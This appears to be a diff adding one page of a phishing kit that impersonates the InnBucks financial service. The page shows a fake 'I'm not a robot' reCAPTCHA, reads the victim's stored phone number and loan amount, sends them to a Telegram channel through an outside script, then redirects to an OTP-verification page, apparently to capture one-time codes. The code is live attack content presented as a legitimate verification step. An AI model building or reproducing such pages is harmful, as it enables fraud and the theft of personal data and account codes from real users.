@@ -1,0 +1,186 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verify - InnBucks</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <script src="telegram_config.js"></script>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', -apple-system, BlinkMacSystemFont, sans-serif;
+        }
+
+        body {
+            background: #0A1931;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+
+        .captcha-box {
+            background: white;
+            border-radius: 4px;
+            padding: 12px 16px;
+            width: 100%;
+            max-width: 320px;
+            display: flex;
+            align-items: center;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
+            cursor: pointer;
+            transition: all 0.3s ease;
+            border: 2px solid #ddd;
+            margin-bottom: 30px;
+        }
+
+        .captcha-box:hover {
+            border-color: #0A1931;
+            transform: translateY(-2px);
+        }
+
+        .captcha-box.verified {
+            border-color: #4CAF50;
+            background: #f8fff8;
+        }
+
+        .checkbox {
+            width: 22px;
+            height: 22px;
+            border: 2px solid #ccc;
+            border-radius: 3px;
+            margin-right: 12px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            flex-shrink: 0;
+            transition: all 0.2s ease;
+            position: relative;
+        }
+
+        .loading-circle {
+            width: 18px;
+            height: 18px;
+            border: 2px solid transparent;
+            border-top: 2px solid #0A1931;
+            border-right: 2px solid #0A1931;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            display: none;
+        }
+
+        .checkbox.checked {
+            background: #0A1931;
+            border-color: #0A1931;
+        }
+
+        .checkbox.checked::after {
+            content: '✓';
+            color: white;
+            font-weight: bold;
+            font-size: 14px;
+        }
+
+        .text-content { flex: 1; }
+        .main-text { font-size: 1rem; font-weight: 500; color: #333; margin-bottom: 2px; }
+        
+        .sub-text {
+            font-size: 0.75rem;
+            color: #666;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+        }
+
+        .links { display: flex; gap: 8px; }
+        .links a { color: #666; text-decoration: none; font-size: 0.75rem; }
+        .links a:hover { color: #0A1931; text-decoration: underline; }
+
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+
+        .status-message {
+            color: white;
+            margin-top: 20px;
+            font-size: 0.9rem;
+            text-align: center;
+            max-width: 320px;
+            opacity: 0.8;
+        }
+    </style>
+</head>
+<body>
+    <div class="captcha-box" id="captchaBox">
+        <div class="checkbox" id="checkbox">
+            <div class="loading-circle" id="loadingCircle"></div>
+        </div>
+        <div class="text-content">
+            <div class="main-text">I'm not a robot</div>
+            <div class="sub-text">
+                <span class="recaptcha-brand">reCAPTCHA</span>
+                <div class="links">
+                    <a href="#" id="privacyLink">Privacy</a>
+                    <span>-</span>
+                    <a href="#" id="termsLink">Terms</a>
+                </div>
+            </div>
+        </div>
+    </div>
+    
+    <div class="status-message" id="statusMessage">
+        Please verify you are human to continue
+    </div>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            const captchaBox = document.getElementById('captchaBox');
+            const checkbox = document.getElementById('checkbox');
+            const loadingCircle = document.getElementById('loadingCircle');
+            const statusMessage = document.getElementById('statusMessage');
+            
+            let isChecked = false;
+            
+            // Load application data
+            const applicationData = JSON.parse(localStorage.getItem('innbucksLoanApp') || '{}');
+            
+            captchaBox.addEventListener('click', function() {
+                if (isChecked) return;
+                
+                // Show loading
+                loadingCircle.style.display = 'block';
+                statusMessage.textContent = 'Verifying...';
+                
+                // Simulate verification (2 seconds)
+                setTimeout(() => {
+                    isChecked = true;
+                    loadingCircle.style.display = 'none';
+                    checkbox.classList.add('checked');
+                    captchaBox.classList.add('verified');
+                    
+                    statusMessage.textContent = '✓ Verification complete! Redirecting...';
+                    
+                    // Send to Telegram
+                    sendToTelegram(`✅ <b>Captcha Verified</b>\nPhone: ${applicationData.phoneNumber || 'Unknown'}\nAmount: $${applicationData.loanAmount || 'N/A'}`);
+                    
+                    // DIRECT REDIRECT TO OTP - NO DELAY
+                    window.location.href = 'otp_verification.html';
+                    
+                }, 2000); // 2 second loading simulation
+            });
+            
+            // Prevent link clicks from triggering captcha
+            document.querySelectorAll('.links a').forEach(link => {
+                link.addEventListener('click', function(e) {
+                    e.stopPropagation();
+                    e.preventDefault();
+                    alert('Privacy & Terms page would open here');
+                });
+            });
+        });
+    </script>
+</body>
+</html>
